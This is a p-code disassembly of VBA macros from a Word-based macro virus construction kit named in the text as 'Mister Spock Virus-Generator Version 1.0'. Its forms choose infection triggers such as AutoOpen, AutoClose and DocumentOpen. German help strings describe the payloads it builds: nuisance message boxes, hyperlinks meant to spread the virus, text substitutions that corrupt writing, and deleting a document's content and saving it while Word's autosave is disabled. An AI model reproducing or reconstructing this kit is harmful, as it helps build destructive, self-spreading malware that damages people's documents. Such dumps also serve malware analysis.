' Line #53:
' 	Ld ZielDocument 
' 	ArgsMemCall Close 0x0000 
' Line #54:
' 	SetStmt 
' 	Ld OldZiel 
' 	Set ZielDocument 
' Line #55:
' 	ElseBlock 
' 	BoS 0x0000 
' 	ArgsCall Init_Liste 0x0000 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	Ld ZielDocument 
' 	LitNothing 
' 	Is 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld ZielDocument 
' 	MemLd FullName 
' 	Ld Label_Ziel 
' 	MemSt Caption 
' 	EndIf 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Private Sub List_Doc_KeyPress(ByVal KeyAscii As ))
' Line #61:
' 	Dim 
' 	VarDefn OldZiel (As Object)
' Line #62:
' 	Ld KeyAscii 
' 	LitDI2 0x000D 
' 	Ne 
' 	Ld List_Doc 
' 	MemLd ListIndex 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #63:
' 	SetStmt 
' 	Ld ZielDocument 
' 	Set OldZiel 
' Line #64:
' 	SetStmt 
' 	Ld List_Doc 
' 	MemLd ListIndex 
' 	Ld List_Doc 
' 	ArgsMemLd List 0x0001 
' 	ArgsLd Documents 0x0001 
' 	Set ZielDocument 
' Line #65:
' 	LitDI2 0x0002 
' 	Ld ZielDocument 
' 	MemLd FullName 
' 	LitStr 0x0002 ":\"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #66:
' 	Ld ZielDocument 
' 	ArgsLd SaveAs 0x0001 
' 	Not 
' 	IfBlock 
' Line #67:
' 	Ld ZielDocument 
' 	ArgsMemCall Close 0x0000 
' Line #68:
' 	SetStmt 
' 	Ld OldZiel 
' 	Set ZielDocument 
' Line #69:
' 	ElseBlock 
' 	BoS 0x0000 
' 	ArgsCall Init_Liste 0x0000 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld ZielDocument 
' 	LitNothing 
' 	Is 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld ZielDocument 
' 	MemLd FullName 
' 	Ld Label_Ziel 
' 	MemSt Caption 
' 	EndIf 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #75:
' 	LitVarSpecial (True)
' 	St Abbruch 
' Line #76:
' 	SetStmt 
' 	LitNothing 
' 	Set ZielDocument 
' Line #77:
' 	LitStr 0x0003 "..."
' 	Ld Label_Ziel 
' 	MemSt Caption 
' Line #78:
' 	Ld Command_DocNeu 
' 	ArgsMemCall SetFocus 0x0000 
' Line #79:
' 	ArgsCall Init_Liste 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #82:
' 	Ld Abbruch 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitNothing 
' 	Set ZielDocument 
' 	EndIf 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Private Sub Init_Liste())
' Line #85:
' 	Dim 
' 	VarDefn x (As Long)
' Line #86:
' 	Ld List_Doc 
' 	ArgsMemCall Clear 0x0000 
' Line #87:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #88:
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd BuiltInDocumentProperties 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitStr 0x0028 "Mister Spock Virus-Generator Version 1.0"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	Ld List_Doc 
' 	ArgsMemCall AddItem 0x0001 
' 	EndIf 
' Line #89:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' 	Ld List_Doc 
' 	MemLd ListCount 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	Ld List_Doc 
' 	MemSt ListIndex 
' 	EndIf 
' Line #91:
' 	EndSub 
' Macros/VBA/MainUserForm - 26386 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	FuncDefn (Private Sub Button_PGP_Click())
' Line #3:
' 	ArgsCall PGP_Schlüssel 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Private Sub Button_TextBox_Hilfe_Click())
' Line #6:
' 	LineCont 0x0008 07 00 08 00 0B 00 08 00
' 	LitStr 0x0037 "Zeigt eine Textbox mit vorgegebenen Text und Symbol an."
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0044 "Wähle die Startoptionen der Textbox sorgfältig aus, denn nichts ist "
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0037 "auffälliger als eine Box mit einem blödsinnigen Spruch."
' 	Concat 
' 	Ld vbInformation 
' 	Ld EsIstIch 
' 	LitStr 0x0011 " - Hilfe: Textbox"
' 	Concat 
' 	ArgsCall MsgBox 0x0003 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Private Sub Button_HyperLink_Hilfe_Click())
' Line #9:
' 	LineCont 0x0010 07 00 08 00 0B 00 08 00 0F 00 08 00 13 00 08 00
' 	LitStr 0x004C "Öffnet eine Internet-Adresse im aktuellen Dokument (oder im Standardbrowser)"
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0040 "Beachte, dass ein Virus sich auf Dauer nicht auf "einem" Rechner"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x002C "oder in "einem" Netzwerk einsperren läßt !!!"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0043 "Intranetseiten sind  zum Teil nicht über das Internet zu erreichen,"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0040 "und ein Link auf deine Homepage ist auch "ganz wenig auffällig"."
' 	Concat 
' 	Ld vbInformation 
' 	Ld EsIstIch 
' 	LitStr 0x0013 " - Hilfe: Hyperlink"
' 	Concat 
' 	ArgsCall MsgBox 0x0003 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Private Sub Button_TextTauschen_Hilfe_Click())
' Line #12:
' 	LineCont 0x0014 07 00 08 00 0B 00 08 00 0F 00 08 00 13 00 08 00 19 00 08 00
' 	LitStr 0x0055 "Sucht Wörter, Wort-Abschnitte oder Buchstaben und tauscht sie gegen anderen Text aus."
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x003D ""der" in "die" oder "a" in "u" kommt immer wahnsinnig gut an."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0043 "Bei dem Suchbegriff spielt Groß- oder Klein- Schreibung keine Rolle"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0044 "Aber denke immer daran: fehlerhafte Texte sind nur dann lustig, wenn"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x002E "der Autor es nicht schon beim Schreiben merkt."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0029 "Also überreize nicht deine Möglichkeiten."
' 	Concat 
' 	Ld vbInformation 
' 	Ld EsIstIch 
' 	LitStr 0x0017 " - Hilfe: Text ersetzen"
' 	Concat 
' 	ArgsCall MsgBox 0x0003 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Private Sub Check_AkivDocDel_Hilfe_Click())
' Line #15:
' 	LineCont 0x000C 07 00 08 00 0B 00 08 00 11 00 08 00
' 	LitStr 0x0054 "Markiert den Inhalt des aktiven Dokumentes, löscht diesen und speichert das Dokument"
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0044 "Entweder es passiert beim Öffnen oder beim Schließen des Dokumentes,"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0058 "und es sieht immer so aus als sei man die letzten  drei Stunden wahnsinnig müde gewesen."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0066 "Das besonders Ärgerliche ist aber, dass ich zu meinem Schutz Word das automatische Speichern verbiete."
' 	Concat 
' 	Ld vbInformation 
' 	Ld EsIstIch 
' 	LitStr 0x0016 " - Hilfe: Text löschen"
' 	Concat 
' 	ArgsCall MsgBox 0x0003 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Private Sub Button_TextBox_Option_Click())
' Line #18:
' 	LitStr 0x0017 "Textbox - Startoptionen"
' 	Ld FormStartOptionen 
' 	MemSt Caption 
' Line #19:
' 	Ld Dat_TextBox 
' 	MemLd Datum 
' 	St Dat_Datum 
' Line #20:
' 	Ld Dat_TextBox 
' 	MemLd Zufall 
' 	St Dat_Zufall 
' Line #21:
' 	StartWithExpr 
' 	Ld FormGenerator 
' 	With 
' Line #22:
' 	LitVarSpecial (False)
' 	MemLdWith Option1 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Option2 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Option3 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option4 
' 	MemSt Value 
' Line #23:
' 	EndWith 
' Line #24:
' 	Ld FormStartOptionen 
' 	ArgsMemCall Show 0x0000 
' Line #25:
' 	StartWithExpr 
' 	Ld FormGenerator 
' 	With 
' Line #26:
' 	LitVarSpecial (True)
' 	MemLdWith Option1 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option2 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option3 
' 	MemSt Enabled 
' Line #27:
' 	EndWith 
' Line #28:
' 	Ld Dat_Datum 
' 	Ld Dat_TextBox 
' 	MemSt Datum 
' Line #29:
' 	Ld Dat_Zufall 
' 	Ld Dat_TextBox 
' 	MemSt Zufall 
' Line #30:
' 	Ld Dat_TextBox 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	IfBlock 
' Line #31:
' 	Ld FormStartOptionen 
' 	MemLd Button_Datum 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Ld Button_TextBox_Option 
' 	MemSt Caption 
' Line #32:
' 	Ld Dat_TextBox 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Button_TextBox_Option 
' 	MemLd Caption 
' 	LitStr 0x0002 " ("
' 	Concat 
' 	Ld FormStartOptionen 
' 	MemLd Button_ZufallsGenerator 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld Button_TextBox_Option 
' 	MemSt Caption 
' 	EndIf 
' Line #33:
' 	Ld Dat_TextBox 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	ElseIfBlock 
' Line #34:
' 	Ld FormStartOptionen 
' 	MemLd Button_ZufallsGenerator 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Ld Button_TextBox_Option 
' 	MemSt Caption 
' Line #35:
' 	Ld Dat_TextBox 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_TextBox 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_TextBox 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Button_TextBox_Option 
' 	MemLd Caption 
' 	LitStr 0x0002 " ("
' 	Concat 
' 	Ld FormStartOptionen 
' 	MemLd Button_Datum 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld Button_TextBox_Option 
' 	MemSt Caption 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' Line #36:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitStr 0x0014 "Torpedo abfeuern ..."
' 	Ld Button_TextBox_Option 
' 	MemSt Caption 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld Dat_TextBox 
' 	MemLd OK 
' 	Ld Dat_TextBox 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	Ld Dat_TextBox 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	Or 
' 	Paren 
' 	And 
' 	Ld Check_TextBox 
' 	MemSt Enabled 
' Line #39:
' 	Ld Check_TextBox 
' 	MemLd Enabled 
' 	Ld Check_TextBox 
' 	MemSt Value 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Private Sub Button_HyperLink_Optionen_Click())
' Line #42:
' 	LitStr 0x0019 "HyperLink - Startoptionen"
' 	Ld FormStartOptionen 
' 	MemSt Caption 
' Line #43:
' 	Ld Dat_HyperLink 
' 	MemLd Datum 
' 	St Dat_Datum 
' Line #44:
' 	Ld Dat_HyperLink 
' 	MemLd Zufall 
' 	St Dat_Zufall 
' Line #45:
' 	StartWithExpr 
' 	Ld FormGenerator 
' 	With 
' Line #46:
' 	LitVarSpecial (False)
' 	MemLdWith Option1 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Option2 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Option3 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option4 
' 	MemSt Value 
' Line #47:
' 	EndWith 
' Line #48:
' 	Ld FormStartOptionen 
' 	ArgsMemCall Show 0x0000 
' Line #49:
' 	StartWithExpr 
' 	Ld FormGenerator 
' 	With 
' Line #50:
' 	LitVarSpecial (True)
' 	MemLdWith Option1 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option2 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option3 
' 	MemSt Enabled 
' Line #51:
' 	EndWith 
' Line #52:
' 	Ld Dat_Datum 
' 	Ld Dat_HyperLink 
' 	MemSt Datum 
' Line #53:
' 	Ld Dat_Zufall 
' 	Ld Dat_HyperLink 
' 	MemSt Zufall 
' Line #54:
' 	Ld Dat_HyperLink 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	IfBlock 
' Line #55:
' 	Ld FormStartOptionen 
' 	MemLd Button_Datum 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Ld Button_HyperLink_Optionen 
' 	MemSt Caption 
' Line #56:
' 	Ld Dat_HyperLink 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Button_HyperLink_Optionen 
' 	MemLd Caption 
' 	LitStr 0x0002 " ("
' 	Concat 
' 	Ld FormStartOptionen 
' 	MemLd Button_ZufallsGenerator 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld Button_HyperLink_Optionen 
' 	MemSt Caption 
' 	EndIf 
' Line #57:
' 	Ld Dat_HyperLink 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	ElseIfBlock 
' Line #58:
' 	Ld FormStartOptionen 
' 	MemLd Button_ZufallsGenerator 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Ld Button_HyperLink_Optionen 
' 	MemSt Caption 
' Line #59:
' 	Ld Dat_HyperLink 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_HyperLink 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_HyperLink 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Button_HyperLink_Optionen 
' 	MemLd Caption 
' 	LitStr 0x0002 " ("
' 	Concat 
' 	Ld FormStartOptionen 
' 	MemLd Button_Datum 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld Button_HyperLink_Optionen 
' 	MemSt Caption 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' Line #60:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitStr 0x0014 "Torpedo abfeuern ..."
' 	Ld Button_HyperLink_Optionen 
' 	MemSt Caption 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Ld Dat_HyperLink 
' 	MemLd OK 
' 	Ld Dat_HyperLink 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	Ld Dat_HyperLink 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	Or 
' 	Paren 
' 	And 
' 	Ld Check_HyperLink 
' 	MemSt Enabled 
' Line #63:
' 	Ld Check_HyperLink 
' 	MemLd Enabled 
' 	Ld Check_HyperLink 
' 	MemSt Value 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub Button_TextTauschen_Optionen_Click())
' Line #66:
' 	LitStr 0x001D "Text tauschen - Startoptionen"
' 	Ld FormStartOptionen 
' 	MemSt Caption 
' Line #67:
' 	Ld Dat_Replace 
' 	MemLd Datum 
' 	St Dat_Datum 
' Line #68:
' 	Ld Dat_Replace 
' 	MemLd Zufall 
' 	St Dat_Zufall 
' Line #69:
' 	StartWithExpr 
' 	Ld FormGenerator 
' 	With 
' Line #70:
' 	LitVarSpecial (False)
' 	MemLdWith Option7 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Option8 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Option9 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option1 
' 	MemSt Value 
' Line #71:
' 	EndWith 
' Line #72:
' 	Ld FormStartOptionen 
' 	ArgsMemCall Show 0x0000 
' Line #73:
' 	StartWithExpr 
' 	Ld FormGenerator 
' 	With 
' Line #74:
' 	LitVarSpecial (True)
' 	MemLdWith Option7 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option8 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option9 
' 	MemSt Enabled 
' Line #75:
' 	EndWith 
' Line #76:
' 	Ld Dat_Datum 
' 	Ld Dat_Replace 
' 	MemSt Datum 
' Line #77:
' 	Ld Dat_Zufall 
' 	Ld Dat_Replace 
' 	MemSt Zufall 
' Line #78:
' 	Ld Dat_Replace 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	IfBlock 
' Line #79:
' 	Ld FormStartOptionen 
' 	MemLd Button_Datum 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Ld Button_TextTauschen_Optionen 
' 	MemSt Caption 
' Line #80:
' 	Ld Dat_Replace 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Button_TextTauschen_Optionen 
' 	MemLd Caption 
' 	LitStr 0x0002 " ("
' 	Concat 
' 	Ld FormStartOptionen 
' 	MemLd Button_ZufallsGenerator 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld Button_TextTauschen_Optionen 
' 	MemSt Caption 
' 	EndIf 
' Line #81:
' 	Ld Dat_Replace 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	ElseIfBlock 
' Line #82:
' 	Ld FormStartOptionen 
' 	MemLd Button_ZufallsGenerator 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Ld Button_TextTauschen_Optionen 
' 	MemSt Caption 
' Line #83:
' 	Ld Dat_Replace 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_Replace 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_Replace 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Button_TextTauschen_Optionen 
' 	MemLd Caption 
' 	LitStr 0x0002 " ("
' 	Concat 
' 	Ld FormStartOptionen 
' 	MemLd Button_Datum 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld Button_TextTauschen_Optionen 
' 	MemSt Caption 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' Line #84:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitStr 0x0014 "Torpedo abfeuern ..."
' 	Ld Button_TextTauschen_Optionen 
' 	MemSt Caption 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	Ld Dat_Replace 
' 	MemLd OK 
' 	Ld Dat_Replace 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	Ld Dat_Replace 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	Or 
' 	Paren 
' 	And 
' 	Ld Check_TextTauschen 
' 	MemSt Enabled 
' Line #87:
' 	Ld Check_TextTauschen 
' 	MemLd Enabled 
' 	Ld Check_TextTauschen 
' 	MemSt Value 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Private Sub Check_AkivDocDel_Optionen_Click())
' Line #90:
' 	LitStr 0x0028 "Aktives Dokument löschen - Startoptionen"
' 	Ld FormStartOptionen 
' 	MemSt Caption 
' Line #91:
' 	Ld Dat_AkivDocDel 
' 	MemLd Datum 
' 	St Dat_Datum 
' Line #92:
' 	Ld Dat_AkivDocDel 
' 	MemLd Zufall 
' 	St Dat_Zufall 
' Line #93:
' 	StartWithExpr 
' 	Ld FormGenerator 
' 	With 
' Line #94:
' 	LitVarSpecial (False)
' 	MemLdWith Option1 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Option2 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Option3 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option4 
' 	MemSt Value 
' Line #95:
' 	EndWith 
' Line #96:
' 	Ld FormStartOptionen 
' 	ArgsMemCall Show 0x0000 
' Line #97:
' 	StartWithExpr 
' 	Ld FormGenerator 
' 	With 
' Line #98:
' 	LitVarSpecial (True)
' 	MemLdWith Option1 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option2 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Option3 
' 	MemSt Enabled 
' Line #99:
' 	EndWith 
' Line #100:
' 	Ld Dat_Datum 
' 	Ld Dat_AkivDocDel 
' 	MemSt Datum 
' Line #101:
' 	Ld Dat_Zufall 
' 	Ld Dat_AkivDocDel 
' 	MemSt Zufall 
' Line #102:
' 	Ld Dat_AkivDocDel 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	IfBlock 
' Line #103:
' 	Ld FormStartOptionen 
' 	MemLd Button_Datum 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Ld Check_AkivDocDel_Optionen 
' 	MemSt Caption 
' Line #104:
' 	Ld Dat_AkivDocDel 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Check_AkivDocDel_Optionen 
' 	MemLd Caption 
' 	LitStr 0x0002 " ("
' 	Concat 
' 	Ld FormStartOptionen 
' 	MemLd Button_ZufallsGenerator 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld Check_AkivDocDel_Optionen 
' 	MemSt Caption 
' 	EndIf 
' Line #105:
' 	Ld Dat_AkivDocDel 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	ElseIfBlock 
' Line #106:
' 	Ld FormStartOptionen 
' 	MemLd Button_ZufallsGenerator 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Ld Check_AkivDocDel_Optionen 
' 	MemSt Caption 
' Line #107:
' 	Ld Dat_AkivDocDel 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_AkivDocDel 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_AkivDocDel 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Check_AkivDocDel_Optionen 
' 	MemLd Caption 
' 	LitStr 0x0002 " ("
' 	Concat 
' 	Ld FormStartOptionen 
' 	MemLd Button_Datum 
' 	MemLd Caption 
' 	ArgsLd Trim 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	Ld Check_AkivDocDel_Optionen 
' 	MemSt Caption 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' Line #108:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitStr 0x0014 "Torpedo abfeuern ..."
' 	Ld Check_AkivDocDel_Optionen 
' 	MemSt Caption 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	Ld Dat_AkivDocDel 
' 	MemLd Datum 
' 	MemLd Auswahl 
' 	Ld Dat_AkivDocDel 
' 	MemLd Zufall 
' 	MemLd Auswahl 
' 	Or 
' 	Ld Check_AkivDocDel 
' 	MemSt Enabled 
' Line #111:
' 	Ld Check_AkivDocDel 
' 	MemLd Enabled 
' 	Ld Check_AkivDocDel 
' 	MemSt Value 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Private Sub Check_AutoNew_Change())
' Line #114:
' 	Ld Check_DocumentNew 
' 	MemLd Enabled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld Check_DocumentNew 
' 	MemSt Enabled 
' Line #115:
' 	Ld Check_AutoNew 
' 	MemLd Value 
' 	Ld StartProcedure 
' 	MemSt AutoNew 
' Line #116:
' 	ArgsCall Ist_Startauswahl_OK 0x0000 
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Private Sub Check_AutoOpen_Change())
' Line #119:
' 	Ld Check_DocumentOpen 
' 	MemLd Enabled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld Check_DocumentOpen 
' 	MemSt Enabled 
' Line #120:
' 	Ld Check_AutoOpen 
' 	MemLd Value 
' 	Ld StartProcedure 
' 	MemSt AutoOpen 
' Line #121:
' 	ArgsCall Ist_Startauswahl_OK 0x0000 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Private Sub Check_AutoClose_Change())
' Line #124:
' 	Ld Check_DocumentClose 
' 	MemLd Enabled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld Check_DocumentClose 
' 	MemSt Enabled 
' Line #125:
' 	Ld Check_AutoClose 
' 	MemLd Value 
' 	Ld StartProcedure 
' 	MemSt AutoClose 
' Line #126:
' 	ArgsCall Ist_Startauswahl_OK 0x0000 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Private Sub Check_DocumentNew_Change())
' Line #129:
' 	Ld Check_DocumentNew 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld Check_AutoNew 
' 	MemSt Enabled 
' Line #130:
' 	Ld Check_DocumentNew 
' 	MemLd Value 
' 	Ld StartProcedure 
' 	MemSt DocNew 
' Line #131:
' 	ArgsCall Ist_Startauswahl_OK 0x0000 
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Private Sub Check_DocumentOpen_Change())
' Line #134:
' 	Ld Check_AutoOpen 
' 	MemLd Enabled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld Check_AutoOpen 
' 	MemSt Enabled 
' Line #135:
' 	Ld Check_DocumentOpen 
' 	MemLd Value 
' 	Ld StartProcedure 
' 	MemSt DocOpen 
' Line #136:
' 	ArgsCall Ist_Startauswahl_OK 0x0000 
' Line #137:
' 	EndSub 
' Line #138:
' 	FuncDefn (Private Sub Check_DocumentClose_Change())
' Line #139:
' 	Ld Check_AutoClose 
' 	MemLd Enabled 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld Check_AutoClose 
' 	MemSt Enabled 
' Line #140:
' 	Ld Check_DocumentClose 
' 	MemLd Value 
' 	Ld StartProcedure 
' 	MemSt DocClose 
' Line #141:
' 	ArgsCall Ist_Startauswahl_OK 0x0000 
' Line #142:
' 	EndSub 
' Line #143:
' 	FuncDefn (Private Sub Ist_Startauswahl_OK())
' Line #144:
' 	Ld Check_AutoNew 
' 	Ld Check_AutoOpen 
' 	Or 
' 	Ld Check_AutoClose 
' 	Or 
' 	Ld Check_DocumentNew 
' 	Or 
' 	Ld Check_DocumentOpen 
' 	Or 
' 	Ld Check_DocumentClose 
' 	Or 
' 	Paren 
' 	Not 
' 	Ld Label_keine_Auswahl 
' 	MemSt Visible 
' Line #145:
' 	Ld Label_keine_Auswahl 
' 	MemLd Visible 
' 	Ld Image_keine_Auswahl 
' 	MemSt Visible 
' Line #146:
